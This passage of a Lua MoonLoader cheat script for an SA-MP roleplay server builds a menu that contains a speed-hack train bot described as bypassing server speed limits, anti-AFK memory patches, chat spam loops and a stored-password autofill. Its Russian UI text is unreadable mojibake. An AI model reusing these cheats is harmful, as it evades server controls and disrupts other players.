						-- AFKMessage(arec.viborserveraedit.v + 1)
						imgui.PushItemWidth(100)
						imgui.InputText(u8'���� �� 1 ����� �������', sellcenabronse)
						imgui.InputText(u8'���� �� 1 ���������� �������', sellcenasera)
						imgui.InputText(u8'���� �� 1 ���� �������', sellcenagold)
						imgui.InputText(u8'���� �� 1 ������� �������', sellcenaplatina)
						imgui.InputText(u8'���� �� 1 ������ ����� � �������', sellcenaprem)
						imgui.InputText(u8'���� �� 1 ������ ����� Super Car Box', sellcenacarbox)
						-- imgui.InputText(u8'���� �� 1 ������ ����� ��������', sellcenaoli)
					else
						imgui.Text(u8'�� ��� �� ���������� �� ���� �������� ����������.')
					end
				end
			end)
			imgui.BlockElements(u8('������������� ���������'),function()
				imgui.Checkbox(u8('�������� ����������'),roulette.videokarta); imgui.SameLine() imgui.TextQuestion(u8('����� ����� ���������� 1�� ���������� �� ������ ��������.'))
				imgui.PushItemWidth(100)
				imgui.InputInt(u8('��������'),roulette.wait1) 
				imgui.SameLine()
				imgui.TextQuestion(u8('�������� ��� ��������� ���������.'))
				imgui.PopItemWidth()
				if imgui.Button(u8('��������/��������� ������������� ���������')) then 
					openchestrullet1()
				end
			end)
			imgui.BlockElements(u8('�������� ����'),function()
			imgui.Checkbox(u8'1.���� �������� ����� � ��� �� ������ ����� ����� ��� ����� � ����.', kursbitcoin)
			imgui.SameLine()
			if imgui.Button(u8('������ ���� BTC/Ethereum/Xrp ������.')) then 
				
				local https = require('ssl.https')
				local res = https.request('https://api.coindesk.com/v1/bpi/currentprice/CNY.json')
				local ress = https.request('https://api.coincap.io/v2/assets/ethereum') 
				local resss = https.request('https://api.coincap.io/v2/assets/xrp')
				
				local numdwdao = ress:gsub('"', ""):gsub("changePercent24Hr.+",""):gsub(".+priceUsd", ""):gsub(",", ""):gsub(":", "")
				sampAddChatMessage('Ethereum: '..numdwdao,-1)
				local numdwdaos = resss:gsub('"', ""):gsub("changePercent24Hr.+",""):gsub(".+priceUsd", ""):gsub(",", ""):gsub(":", "")
				sampAddChatMessage('Xrp: '..numdwdaos,-1)
				numwwwddwwww = res:gsub('"', ""):gsub(".+United States Dollar",""):gsub("},CNY.+", ""):gsub("rate_float", ""):gsub(",", ""):gsub(":", "")
				sampAddChatMessage("Btc: " ..numwwwddwwww,-1)
			end
			imgui.SameLine()
			imgui.Text(u8'Btc now: ' ..tostring(numwwwddwwww))
			imgui.Checkbox(u8'2.���� ���� ����� ������� ����� ����� ��� ����� � ����.', kurseuro)
			if kursbitcoin.v or kurseuro.v then
				imgui.PushItemWidth(100)
				imgui.InputInt(u8('<-- ��� X'),roulette.bitcoinandeurox)  
				imgui.SameLine()
				imgui.PushItemWidth(100)
				imgui.InputInt(u8('<-- ��� Y'),roulette.bitcoinandeuroy) 
				imgui.Separator()
			end
			imgui.Checkbox(u8'������ ������ ����� (����� ���/�����) ����� �� �����.', spcarstime)
			if spcarstime.v then
				imgui.PushItemWidth(100)
				imgui.InputInt(u8('<-- ��� X.'),roulette.timerspx) 
				imgui.SameLine()
				imgui.PushItemWidth(100)
				imgui.InputInt(u8('<-- ��� Y.'),roulette.timerspy) 
				imgui.Separator()
			end
			imgui.Checkbox(u8'3.������� ��������� ������ ��� ����.', settingspatcher)
			if settingspatcher.v then
			imgui.Separator() 
			imgui.Checkbox(u8'������� ����� � ����.', wavecc)
			imgui.Checkbox(u8'���� ������ ����� ����������� - ������ ����� �� ����� �����������.', inputefix) 
			imgui.Checkbox(u8'����� ��� ������ ��������� �/c ������ �� ����� ���������� ����� ���.', fixelploitmaver) 
			imgui.Checkbox(u8'���� ���� �������� �� �������.', limitdorogalv)
			imgui.Checkbox(u8'���������� ������� �� �����.', helicoptervinti)
			imgui.Checkbox(u8'���������� ������� �� ������.', stolbi)
			imgui.Checkbox(u8'���������� �������� ���������.', shlagbaum)
			imgui.Checkbox(u8'���� �������� �� �� �����.', zhdputi)
			imgui.Separator()
			end
			imgui.Checkbox(u8'4.����-������ Fam-�������� ��� ������ � ����', oplatafamkv)
			imgui.Checkbox(u8'5.�������� ��������� ��� ������� (������ � �������)', settingsperedai)
			if settingsperedai.v then
				imgui.Separator()
				imgui.Checkbox(u8'�������� ������', enableperedai)
				if enableperedai.v then
					imgui.SameLine()
					imgui.PushItemWidth(100)
					imgui.InputText(u8'<-- ������� id �������� ����� ��������', idperedai)
					imgui.SameLine()
					imgui.PushItemWidth(100)
					imgui.InputText(u8'<-- ������� ����� ������� ����� ��������.', summperedai)
				end
				imgui.Separator()
			end
			imgui.Checkbox(u8('6.������� ��������� ����-�������.'), settingszatochka)
			if settingszatochka.v then
				imgui.Text(u8'�������� �� ������� ����� �������� ���:')
				imgui.SameLine()
				imgui.Checkbox(u8'����-�������', checked_box)
				imgui.Separator()
				for i=1, 12 do
					if i~=6 and i~=12 then
						imgui.RadioButton('+'..i, checked_radio, i)
						imgui.SameLine()
					else
						imgui.RadioButton('+'..i, checked_radio, i)
					end
				end
				imgui.Separator()	
			end
			if depositfill.v then
				imgui.Separator()	
			end
			imgui.Checkbox(u8'7.������ �� 5.000.000$ � ������ �� ������� ( ��� ����� ������ �� ������ N )', depositfill)
			if depositfill.v then
				imgui.PushItemWidth(100)
				imgui.InputInt(u8('����� ������ � ��� �� ����� ��� ���������� ��������?'),roulette.strokadlyafulladepa) 
				imgui.Separator()	
			end
			imgui.Checkbox(u8'8.���� ������������ ��������� � ��� ��� ���� ��� �� �����������.', fixvr)
			imgui.Checkbox(u8'9.Dual monitor fix (���� � ��� 2 �������� ������ �������� ���).', dualmonitor)
			imgui.Checkbox(u8'10.���� ��� ����� �� Arizona-RP (������� ����� ������� ��� ������ �� ������).', arizonavhod)
			imgui.Checkbox(u8'11.����-���� ����.', shar)
			imgui.Checkbox(u8'12.����� ���� � ��� ����� ����� (����� �������).', mavericshar)
			imgui.Checkbox(u8'13.�������� ������� (������������� ������������ ��������� ������� ����� ������ ���������)', autorollrul)
			imgui.Checkbox(u8'14.����-����� (��������� ��������� � ����)', antilomka)
			imgui.Checkbox(u8'15.����-�������� �������� ����-���', skipzz)
			imgui.Checkbox(u8'16.����-������ �������� ��� ������ � ����', troplata)
			imgui.Checkbox(u8'17.����-��������� �� ���� �� ���������', ttactive)
			if autopass.v then
				imgui.Separator()
			end
			imgui.Checkbox(u8'18.�������� ������ �� ����� � �����', autopass)
			if autopass.v then
				imgui.PushItemWidth(100)
				imgui.InputText(u8'������� ������ �� �����', pass)
				imgui.Separator()
			end
			if settingsunload.v then
				imgui.Separator()
			end
			imgui.Checkbox(u8('19.������� ��������� �������� �������.'), settingsunload)
			if settingsunload.v then
				if imgui.Button(u8('��������� ���� ������� � ���� ������.')) then 
					unloadplayers()
				end
				imgui.Checkbox(u8'��������� ���� ������� ��������� (���� �������� �������).', unloadpeds)
				imgui.Checkbox(u8'��������� ��� ������ ��������� (���� �������� �������).', unloadcars)
				imgui.Separator()
			end
			if ctime.v then
				imgui.Separator()
			end
			imgui.Checkbox(u8'20.����� �� ������ (c-time).', ctime)
			if ctime.v then
				imgui.PushItemWidth(100)
				imgui.InputInt(u8('.<-- ��� X.'),roulette.dtimerosx)  
				imgui.SameLine()
				imgui.PushItemWidth(100)
				imgui.InputInt(u8('.<-- ��� Y.'),roulette.dtimerosy) 
				imgui.Separator()
			end
			imgui.Checkbox(u8'21.������� ��������� ������ ����� �� ����� ���.', changercarsettings)
			if changercarsettings.v then
				imgui.Separator()
				imgui.Checkbox(u8'�������� ���� ��� ������ �1.', enablefirstline)
				if enablefirstline.v then
				imgui.SameLine()
				imgui.PushItemWidth(100)
				imgui.InputInt(u8('<-- �������� ���� id.'),roulette.firstlinefirstnumber) 
				imgui.SameLine()
				imgui.PushItemWidth(100)
				imgui.InputInt(u8('<-- �� ���� id.'),roulette.firstlinetwnumber) 
				end
				imgui.Checkbox(u8'�������� ���� ��� ������ �2.', enablefirstlinee)
				if enablefirstlinee.v then
				imgui.SameLine()
				imgui.PushItemWidth(100)
				imgui.InputInt(u8('<--- �������� ���� id.'),roulette.firstlinefirstnumberr) 
				imgui.SameLine()
				imgui.PushItemWidth(100)
				imgui.InputInt(u8('<--- �� ���� id.'),roulette.firstlinetwnumberr) 
				end
				imgui.Separator()
			end
			imgui.Checkbox(u8'22.������� ��� (���������/������� ������� ���� �� ��� � ����� ���������� �������� ����.).', sprint)
			if sprint.v then
				imgui.Separator()
				for m=1, 2 do
					if m == 1 then
						imgui.RadioButton('Shift', roulette.checked_radiofwafwa, m)
					else
						imgui.SameLine()
						imgui.RadioButton('Space', roulette.checked_radiofwafwa, m)
						imgui.SameLine()
						imgui.TextQuestion(u8(' (�������� ������� �� ������� �������� ���.	)'))
					end
				end
			end
		end)
			imgui.BlockElements(u8('���������'),function() 
				if imgui.Button(u8('���������������� ������.')) then 
					sampDisconnectWithReason(quit)
					sampSetGamestate(1)
				end
				if imgui.Button(u8('���������������� ����� 15 ������.')) then
						reconsec()
				end
				imgui.Checkbox(u8('�������� �������������'), arec.state)
				if arec.state.v then
					if not clrecon.v then
						imgui.SameLine()
						imgui.Checkbox(u8'����� ����-�������� (������)', clrecon)
						imgui.SameLine()
						imgui.TextQuestion(u8(' (�������� �������� ������� ����� �� ���������� ������� �� ������)'))
						imgui.PushItemWidth(80)
						imgui.InputInt(u8('��������.'),arec.wait)
					else
						imgui.SameLine()
						imgui.Checkbox(u8'����� ����-�������� (������)', clrecon)
						imgui.SameLine()
						imgui.TextQuestion(u8(' (�������� �������� ������� ����� �� ���������� ������� �� ������)'))
						imgui.PushItemWidth(80)
						imgui.InputInt(u8('��������. �1'),arec.randomnumberconnect1)
						imgui.InputInt(u8('��������. �2'),arec.randomnumberconnect2)
					end
				end
			end)
			imgui.BlockElements(u8('������(�� ���-���� ���������� ������������ ��� ���� �� �� ����� ������! ���� �� �������� �� ����� - ����������.)'),function() 
				imgui.BeginGroup()
				imgui.PushItemWidth(500)
				imgui.InputText(u8('1 ������'),piar.piar1)
				imgui.InputText(u8('2 ������'),piar.piar2)
				imgui.SameLine()
				imgui.TextQuestion(u8('�������� ������ ������ ���� �� ������ � ������������'))
				imgui.InputText(u8('3 ������'),piar.piar3)
				imgui.SameLine()
				imgui.TextQuestion(u8('�������� ������ ������ ���� �� ������ � ������������'))
				imgui.PopItemWidth()
				imgui.EndGroup()
				
				imgui.SameLine()
				
				imgui.BeginGroup()
				imgui.PushItemWidth(80)
				imgui.InputInt(u8('��������(� ���.)'),piar.piarwait); 
				imgui.InputInt(u8('��������(� ���.)##123'),piar.piarwait2); 
				imgui.InputInt(u8('��������(� ���.)##2211'),piar.piarwait3); 
				imgui.PopItemWidth()
				imgui.EndGroup()
				
				if imgui.Button(u8('������������ ������/�������������� ������')) then 
					bizpiaron = not bizpiaron
					AFKMessage(bizpiaron and '���� �������!' or '���� ��������!',5)
					if bizpiaron then 
						bizpiarhandle = lua_thread.create(bizpiar) 
						bizpiarhandle2 = lua_thread.create(bizpiar2) 
						bizpiarhandle3 = lua_thread.create(bizpiar3) 
					else 
						lua_thread.terminate(bizpiarhandle) 
						lua_thread.terminate(bizpiarhandle2) 
						lua_thread.terminate(bizpiarhandle3) 
					end
				end
			end)
			imgui.BlockElements(u8('��������� ���������'),function() 
				if imgui.Checkbox(u8('AntiAFK'),antiafk) then workpaus(antiafk.v) end
				imgui.SameLine()
				imgui.TextQuestion(u8('�� �� ������ ������ � AFK ���� �������� ����\n��������! ���� AntiAFK ������� � �� ��������� ��������� �� ��� ��������� ������ �� ������������� ���������! ������ ���!'))
				--imgui.Checkbox(u8('AutoScreenBan'),banscreen)
				--imgui.SameLine()
				--imgui.TextQuestion(u8('���� ��� ������� ����� �� ����� ��������� �������������'))
				imgui.PushItemWidth(150)

				imgui.Combo(u8'����� ����',arec.combobombo1,checkfrac)
				if not (arec.combobombo1.v == 0) then
					imgui.SameLine()
					imgui.PushItemWidth(100)
					imgui.InputInt(u8('������������ ���� ����.'),roulette.backgroundmenu)
				end 
				if arec.combobombo1.v == 0 then
					theme()
				end
				if arec.combobombo1.v == 1 then
					theme1()
				end
				if arec.combobombo1.v == 2 then
					theme2()
				end
				if arec.combobombo1.v == 3 then
					theme3()
				end
				if arec.combobombo1.v == 4 then
					theme4()
				end
				if arec.combobombo1.v == 5 then
					theme5()
				end
				if arec.combobombo1.v == 6 then
					theme6()
				end
				if arec.combobombo1.v == 7 then
					theme7()
				end
				if arec.combobombo1.v == 8 then
					theme8()
				end
				imgui.SetCursorPosX(900/2 - 300/2)
				imgui.BeginGroup()
				if imgui.Button(u8('��������� ���������'),imgui.ImVec2(150,30)) then saveini() end
				imgui.SameLine()
				if imgui.Button(u8('������������� ������'),imgui.ImVec2(150,30)) then 
					lua_thread.create(function ()
					afksets.v = not afksets.v
					wait(80)
					thisScript():reload()
					end)
				end
				imgui.EndGroup()
			end)
			imgui.CenterText(u8('������� ESC ����� ������� ������ ����'))
		elseif menunum == 3 then
			imgui.BlockElements(u8('�������� �������/�������'),function()
				if imgui.Button(u8('����-������� + ���������. ��������� /rcon ��� /fconnect 1 65')) then 
					uploadplugins1()
				end
				if imgui.Button(u8('���� ���� ��� �� ��������. ��������� ��������������.')) then 
					uploadplugins2()
				end
			end)
		elseif menunum == 9 then
			imgui.BlockElements(u8('�������� ������� ����'),function()
				
				imgui.PushItemWidth(80)
				imgui.InputInt(u8('������ ����.'),arec.sizemenu) 
			end)
		elseif menunum == 8 then -- train bot
				imgui.BlockElements(u8('��� �������� ������������� (15 ���)'),function()
					imgui.PushItemWidth(200)
					imgui.SliderFloat("Distance to start stoping", sliders.slider1, 5, 500, "%.0f")
					imgui.SliderFloat("Boost speed to ur original speed --> ("..tostring(info['speed'])..")", sliders.slider2, 0, 2)
					imgui.SliderFloat("Ur original speed (If u choose more 32, script bypass server speed). P.S If u choose > 47 ur train may shake.", sliders.slider3, 10, 50, "%.0f")
					imgui.SliderFloat("Fast Stoping speed.", sliders.slider4, 0.01, 10)
					if imgui.Button(u8('Boost/FastStop speed by Speed-Hack.')) then 
						info['boostSpeed'] = not info['boostSpeed']
					end
					imgui.SameLine()
					imgui.Text(u8'Boost/FastStop-Speed State: ' ..tostring(info['boostSpeed']))
					imgui.Separator()
					if imgui.Button(u8('��������/��������� ����.')) then 
						train_start()
					end
					imgui.Text(u8'Bot State: ' ..traintrue)
				end)
				imgui.BlockElements(u8('���������� ��������'),function() 
					imgui.SameLine()
					imgui.SetCursorPosX(900/2 - 300/2)
					imgui.BeginGroup()
					if imgui.Button(u8('��������� ���������'),imgui.ImVec2(150,30)) then saveini() end
					imgui.SameLine()
					if imgui.Button(u8('������������� ������'),imgui.ImVec2(150,30)) then thisScript():reload() end
					imgui.EndGroup()
				end)
		elseif menunum == 1 then
			imgui.BlockElements(u8('�����-�������'),function()
				imgui.PushItemWidth(150)
				imgui.Combo(u8'�������� ���',arec.combobombo2,launchermobilechoose)
				if imgui.Button(u8('��������� ��� ����� ��� �����������.')) then 
					uploadfiles()
				end
			end)
			-- imgui.BlockElements(u8('������ Marshmallows Fam'),function()
			-- 	if imgui.Button(u8('��������� ���� ��� ������ ����(������ ���� � ��� ���� ���������� � ���).')) then 
			-- 		floodvipchat()
			-- 	end
			-- 	if imgui.Button(u8('��������� ���� ��� ������ ������ �����.')) then 
			-- 		floodvipchat2()
			-- 	end
			-- end)
			imgui.BlockElements(u8('���������� ��������'),function() 
				imgui.SameLine()
				imgui.SetCursorPosX(900/2 - 300/2)
				imgui.BeginGroup()
				if imgui.Button(u8('��������� ���������'),imgui.ImVec2(150,30)) then saveini() end
				imgui.SameLine()
				if imgui.Button(u8('������������� ������'),imgui.ImVec2(150,30)) then thisScript():reload() end
				imgui.EndGroup()
			end)
		elseif menunum == 2 then
			if menufill == 0 then
				autofillelementsaccs()
			elseif menufill == 1 then
				autofillelementssave()
			end
		end
        imgui.End()
    end
end
function bizpiar()
	while true do wait(0)
		if bizpiaron then
			sampSendChat(u8:decode(piar.piar1.v))
			wait(piar.piarwait.v * 1000)
		end
	end
end


function cmdSetTime(param)
	ignore_server_time = true
	local stswhour = tonumber(param)
	if stswhour ~= nil and stswhour >= 0 and stswhour <= 23 then
		stswtime = stswhour
		AFKMessage('{EAEAEA}Time change to: {d33641}'..tostring(stswtime)..'{EAEAEA} hour(s).')
	  	-- patch_samp_time_set(true)
	else
	  	-- patch_samp_time_set(false)
	  	stswtime = nil
	end
end
  
function cmdSetWeather(param)
	ignore_server_time = true
local stswweather = tonumber(param)
	if stswweather ~= nil and stswweather >= 0 and stswweather <= 45 then
		
		AFKMessage('{EAEAEA}Weather change to: {d33641}'..tostring(stswweather)..'{EAEAEA}.')
		forceWeatherNow(stswweather)
	end
end

-- function patch_samp_time_set(enable)
-- 	if enable and default == nil then
-- 		default = readMemory(sampGetBase() + 0x9C0A0, 4, true)
-- 		writeMemory(sampGetBase() + 0x9C0A0, 4, 0x000008C2, true)
-- 	elseif enable == false and default ~= nil then
-- 		writeMemory(sampGetBase() + 0x9C0A0, 4, default, true)
-- 		default = nil
-- 	end
-- end

function bizpiar2()
	while true do wait(0)
		if bizpiaron then
			if piar.piar2.v:len() > 0 then
				sampSendChat(u8:decode(piar.piar2.v))
			end
			wait(piar.piarwait2.v * 1000)
		end
	end
end
function bizpiar3()
	while true do wait(0)
		if bizpiaron then
			if piar.piar3.v:len() > 0 then
				sampSendChat(u8:decode(piar.piar3.v))
			end
			wait(piar.piarwait3.v * 1000)
		end
	end
end
function sendvrchat()
	if stopp == false then
		lua_thread.create(function ()
			stopp = true
			sampSendChat('/vr ' .. message)
			wait(250)
			stopp = false
		end)
	end
end
function fastconnectupd()
	-- lua_thread.create(function ()
	-- 	if not sampIsLocalPlayerSpawned() then
	-- wait(10)
	-- sampSetChatInputEnabled(true)
	-- sampSetChatInputText("/fconnect 1 850")
	-- setVirtualKeyDown(13, true)
	-- setVirtualKeyDown(13, false)
	-- 	end
	-- end)
end
function saveini()
	--other
	mainIni.config.whoru = whoru.v
	mainIni.config.helicoptervintiw = helicoptervinti.v 
	mainIni.config.zhdputiw = zhdputi.v 
	mainIni.config.stolbiw = stolbi.v  
	mainIni.config.settingszatochkaw = settingszatochka.v 
	mainIni.config.fixvrw = fixvr.v  
	mainIni.config.settingsperedaiw = settingsperedai.v 
	mainIni.config.fixelploitmaverw = fixelploitmaver.v 
	mainIni.config.inputefixw = inputefix.v 
	mainIni.config.waveccw = wavecc.v
	mainIni.config.limitdorogalvw = limitdorogalv.v 
	mainIni.config.launchermobilew = launchermobile.v
	mainIni.config.launcheroffw = launcheroff.v
	mainIni.config.launcherpcw = launcherpc.v
	mainIni.config.checked_boxw = checked_box.v
	mainIni.config.enableperedaiw = enableperedai.v 
	mainIni.config.enablefirstlinew = enablefirstline.v
	mainIni.config.enablefirstlineew = enablefirstlinee.v
	mainIni.config.troplataw = troplata.v  
	mainIni.config.changercarsettingsw = changercarsettings.v
	mainIni.config.depositfillw = depositfill.v 
	mainIni.config.ctimew = ctime.v
	mainIni.config.sprintw = sprint.v
	mainIni.config.oplatafamkvw = oplatafamkv.v 
	mainIni.config.autoriletkiw = autoriletki.v  
	mainIni.config.launcherplayerw = launcherplayer.v
	mainIni.config.spcarstimew = spcarstime.v
	mainIni.config.kurseurow = kurseuro.v
	mainIni.config.kursbitcoinw = kursbitcoin.v 
	mainIni.config.mavericsharw = mavericshar.v 
	mainIni.config.arizonavhodw = arizonavhod.v 
	mainIni.config.dualmonitorw = dualmonitor.v
	mainIni.config.unloadpedsw = unloadpeds.v
	-- mainIni.config.unloadcarsw = unloadcars.v
	mainIni.config.settingsunloadw = settingsunload.v
	mainIni.config.skipzzw = skipzz.v 
	mainIni.config.safemodew = safemode.v 
	mainIni.config.clreconw = clrecon.v
	mainIni.config.autorollrulw = autorollrul.v
	mainIni.config.shlagbaumw = shlagbaum.v 
	mainIni.config.sharw = shar.v
	mainIni.config.antilomkaw = antilomka.v
	mainIni.config.ttactivew = ttactive.v 
	mainIni.config.settingspatcherw = settingspatcher.v
	mainIni.config.summperedai = summperedai.v 
	mainIni.config.idperedai = idperedai.v 
	
	--login
	mainIni.config.password = pass.v 
	mainIni.config.autopassw = autopass.v
	mainIni.autologin.state = autologin.state.v
	--autoreconnect
	mainIni.arec.state = arec.state.v
	mainIni.arec.wait = arec.wait.v
	mainIni.arec.combobombo1 = arec.combobombo1.v
	mainIni.arec.sizemenu = arec.sizemenu.v
	mainIni.arec.randomnumberconnect2 = arec.randomnumberconnect2.v
	mainIni.arec.randomnumberconnect1 = arec.randomnumberconnect1.v
	mainIni.arec.combobombo2 = arec.combobombo2.v 
	mainIni.arec.viborserveraedit = arec.viborserveraedit.v 

	
	--roulette
	
	mainIni.config.sellcenabronse = sellcenabronse.v
	mainIni.config.sellcenaoli = sellcenaoli.v 
	mainIni.config.sellcenacarbox = sellcenacarbox.v 
	mainIni.config.sellcenagold = sellcenagold.v 
	mainIni.config.sellcenaprem = sellcenaprem.v 
	mainIni.config.sellcenasera = sellcenasera.v 
	mainIni.config.sellcenaplatina = sellcenaplatina.v 
	mainIni.roulette.standart = roulette.standart.v
	mainIni.roulette.videokarta = roulette.videokarta.v
	mainIni.roulette.donate = roulette.donate.v
	mainIni.roulette.platina = roulette.platina.v
	mainIni.roulette.ilon = roulette.ilon.v
	mainIni.roulette.lossantos = roulette.lossantos.v
	--mainIni.roulette.valentin = roulette.valentin.v
	mainIni.roulette.wait = roulette.wait.v
	mainIni.roulette.wait1 = roulette.wait1.v
	mainIni.roulette.bitcoinandeurox = roulette.bitcoinandeurox.v 
	mainIni.roulette.checked_radiofwafwa = roulette.checked_radiofwafwa.v
	mainIni.roulette.dtimerosx = roulette.dtimerosx.v
	mainIni.roulette.dtimerosy = roulette.dtimerosy.v
	mainIni.roulette.backgroundmenu = roulette.backgroundmenu.v
	mainIni.roulette.bitcoinandeuroy = roulette.bitcoinandeuroy.v
	mainIni.roulette.timerspx = roulette.timerspx.v
	mainIni.roulette.timerspy = roulette.timerspy.v 
	mainIni.roulette.firstlinefirstnumber = roulette.firstlinefirstnumber.v 
	mainIni.roulette.firstlinetwnumber = roulette.firstlinetwnumber.v
	mainIni.roulette.firstlinefirstnumberr = roulette.firstlinefirstnumberr.v 
	mainIni.roulette.firstlinetwnumberr = roulette.firstlinetwnumberr.v
	mainIni.roulette.strokadlyafulladepa = roulette.strokadlyafulladepa.v
	--piar
	--main config
	mainIni.config.antiafk = antiafk.v
	-- mainIni.config.banscreen = banscreen.v
	--eat
	-- mainIni.eat.eatmetod = eatmetod.v
    -- mainIni.eat.arztextdrawid = arztextdrawid.v
    -- mainIni.eat.arztextdrawidheal = arztextdrawidheal.v
    -- mainIni.eat.setmetod = setmetod.v
    -- mainIni.eat.hpmetod = hpmetod.v
    -- mainIni.eat.hplvl = hplvl.v
    -- mainIni.eat.healstate = healstate.v
    -- mainIni.eat.drugsquen = drugsquen.v
	saved = inicfg.save(mainIni,'afktools.ini')
	AFKMessage('��������� INI ��������� �1 '..(saved and '�������!' or '� �������!'))
	
	--print(checked_radiofwafwa.v)
	-- saveone()
	savetw()
	
end
function savetw()
	
	mainIni.config.unloadcarsw = unloadcars.v
	mainIni.piar.piar1 = piar.piar1.v
	mainIni.piar.piar2 = piar.piar2.v
	mainIni.piar.piar3 = piar.piar3.v
	mainIni.piar.piarwait = piar.piarwait.v
	mainIni.piar.piarwait2 = piar.piarwait2.v
	mainIni.piar.piarwait3 = piar.piarwait3.v
	mainIni.config.statsrulw = statsrul.v
	saved = inicfg.save(mainIni,'afktools.ini')
	AFKMessage('��������� INI ��������� �2 '..(saved and '�������!' or '� �������!'))
end
-- function saveone()
-- 	mainIninote.config.notepadafk = notepadafk.v 
-- 	savedd = inicfg.save(mainIninote,'afktoolsnote.ini')
-- end
function imgui.TextQuestion(text)
	imgui.TextDisabled('(?)')
	if imgui.IsItemHovered() then
	  imgui.BeginTooltip()
	  imgui.PushTextWrapPos(450)
	  imgui.TextUnformatted(text)
	  imgui.PopTextWrapPos()
	  imgui.EndTooltip()
	end
end
function autofillelementsaccs()
	if imgui.Button(u8'��������� �������') then menufill = 1 end
	imgui.SameLine()
	imgui.Checkbox(u8('�������� ��������������'),autologin.state); imgui.SameLine(); imgui.TextQuestion(u8('�������� �������������� � �������'))
	imgui.SameLine()
	imgui.CenterText(u8'��������������'); imgui.SameLine()
	if imgui.Button('Refresh') then
		local f = io.open(file, "r")
		if f then
			savepass = decodeJson(f:read("a*"))
			f:close()
		end
		AFKMessage('���������')
	end
	imgui.Separator()
	imgui.Columns(3, _, false)
	imgui.SetColumnWidth(-1, 150); imgui.Text(u8"�������"); imgui.NextColumn()
	imgui.SetColumnWidth(-1, 150); imgui.Text(u8"������"); imgui.NextColumn()
	imgui.SetColumnWidth(-1, 450); imgui.Text(u8"������"); imgui.NextColumn()
	for k, v in pairs(savepass) do
		passcount = 0
		for f,t in pairs(v[3]) do
			passcount = passcount + 1
		end
		if imgui.Selectable(u8(v[1]..'##'..k), false, imgui.SelectableFlags.SpanAllColumns) then imgui.OpenPopup('##acc'..k) end
		imgui.SetNextWindowSize(imgui.ImVec2(400,180))
		if imgui.BeginPopupModal('##acc'..k,true,imgui.WindowFlags.NoTitleBar + imgui.WindowFlags.NoResize) then
			btnWidth = 400 - 15
			btnWidth2 = 400 - 20
			imgui.CenterText(u8('������� '..v[1]))
			imgui.Separator()
			for f,t in pairs(v[3]) do
				imgui.Text(u8('������[ID]: '..v[3][f].id..' �������� ������: '..v[3][f].text))
				if editpass.numedit == f then
					imgui.PushItemWidth(btnWidth)
					imgui.InputText(u8'##pass'..f,editpass.input)
					imgui.PopItemWidth()
				end
				if editpass.numedit == -1 then
					if imgui.Button(u8("������� ������##"..f), imgui.ImVec2(btnWidth, 0)) then
						editpass.input.v = v[3][f].text
						editpass.numedit = f
						AFKMessage('������� � ���� ����� ������ � ������� ������ "�����������"')
					end
				elseif editpass.numedit == f then
					if imgui.Button(u8("�����������##"..f), imgui.ImVec2(btnWidth, 0)) then
						v[3][f].text = editpass.input.v
						editpass.input.v = ''
						editpass.numedit = -1
						AFKMessage('������ �������!')
						savejson()
					end
				end
				if imgui.Button(u8("���������� ������##"..f), imgui.ImVec2(btnWidth2/2, 0)) then
					setClipboardText(v[3][f].text)
					AFKMessage('������ ����������!')
					imgui.CloseCurrentPopup()
				end
				imgui.SameLine()
				if imgui.Button(u8("������� ������##"..f), imgui.ImVec2(btnWidth2/2, 0)) then
					v[3][f] = nil
					AFKMessage('������ ������!')
					if #v[3] == 0 then
						savepass[k] = nil
					end
					imgui.CloseCurrentPopup()
					savejson()
				end
				imgui.Separator()
			end
			if imgui.Button(u8("������������"), imgui.ImVec2(btnWidth, 0)) then
				local ip, port = string.match(v[2], "(.+)%:(%d+)")
				sampConnectToServer(ip, tonumber(port))
				sampSetLocalPlayerName(v[1])
			end
			if imgui.Button(u8("������� ��� ������"), imgui.ImVec2(btnWidth, 0)) then
				savepass[k] = nil
				imgui.CloseCurrentPopup()
				savejson()
			end
			if imgui.Button(u8("�������"), imgui.ImVec2(btnWidth, 0)) then
				imgui.CloseCurrentPopup()
			end
			imgui.EndPopup()
		end
		imgui.NextColumn()
		imgui.Text(tostring(v[2]))
		imgui.NextColumn()
		imgui.Text(u8('���-�� �������: '..passcount..'. ������� ��� ��� ���������� ��������'))
		imgui.NextColumn()
	end
	imgui.Columns(1)
end

function autofillelementssave()
	if imgui.Button(u8'< ��������') then menufill = 0 end
	imgui.SameLine()
	imgui.CenterText(u8'��������������')
	imgui.SameLine(); if imgui.Button('Clear') then temppass = {}; AFKMessage('����� ��������� ������� ������!') end
	imgui.Separator()
	imgui.Columns(5, _, false)
	imgui.SetColumnWidth(-1, 160); imgui.Text(u8"������[ID]"); imgui.NextColumn()
	imgui.SetColumnWidth(-1, 150); imgui.Text(u8"�������"); imgui.NextColumn()
	imgui.SetColumnWidth(-1, 150); imgui.Text(u8"������"); imgui.NextColumn()
	imgui.SetColumnWidth(-1, 170); imgui.Text(u8"��������� ������"); imgui.NextColumn()
	imgui.SetColumnWidth(-1, 140); imgui.Text(u8"�����"); imgui.NextColumn()
	for k, v in pairs(temppass) do
		if imgui.Selectable(tostring(u8(string.gsub(v.title, "%{.*%}", "") .. "[" .. v.id .. "]")) .. "##" .. k, false, imgui.SelectableFlags.SpanAllColumns) then
			local data = temppass[k]
			local id = findAcc(data.nick, data.ip)
			if id > -1 then
				local dId = findDialog(id, data.id)
				if dId == -1 then
					table.insert(savepass[id][3], {
						id = data.id,
						text = data.text
					})
				end
			else
				table.insert(savepass, {
					data.nick,
					data.ip,
					{
						{
							id = data.id,
							text = data.text
						}
					}
				})
			end
			savejson()
			AFKMessage('������ '..v.text..' ��� �������� '..v.nick..' �� ������� '..v.ip..' ��������!')
		end
		imgui.NextColumn()
		imgui.Text(tostring(v.nick))
		imgui.NextColumn()
		imgui.Text(tostring(v.ip))
		imgui.NextColumn()
		imgui.Text(tostring(u8(v.text)))
		imgui.NextColumn()
		imgui.Text(tostring(v.time))
		imgui.NextColumn()
	end
	imgui.Columns(1)
end
function takeScreen()
	if isSampLoaded() then
		memory.setuint8(sampGetBase() + 0x119CBC, 1)
	end
end
function workpaus(bool)
    if bool then
        memory.setuint8(7634870, 1)
        memory.setuint8(7635034, 1)
        memory.fill(7623723, 144, 8)
        memory.fill(5499528, 144, 6)
    else
        memory.setuint8(7634870, 0)
        memory.setuint8(7635034, 0)
        memory.hex2bin('5051FF1500838500', 7623723, 8)
        memory.hex2bin('0F847B010000', 5499528, 6)
	end
end
close = false 
function rescar()
	lua_thread.create(function()
		wait(20000)
		sampSendChat('/fixmycar '..carname)
	end)
end
function sampev.onServerMessage(color, text)
	-- AFKMessage(text)
	-- AFKMessage(color)
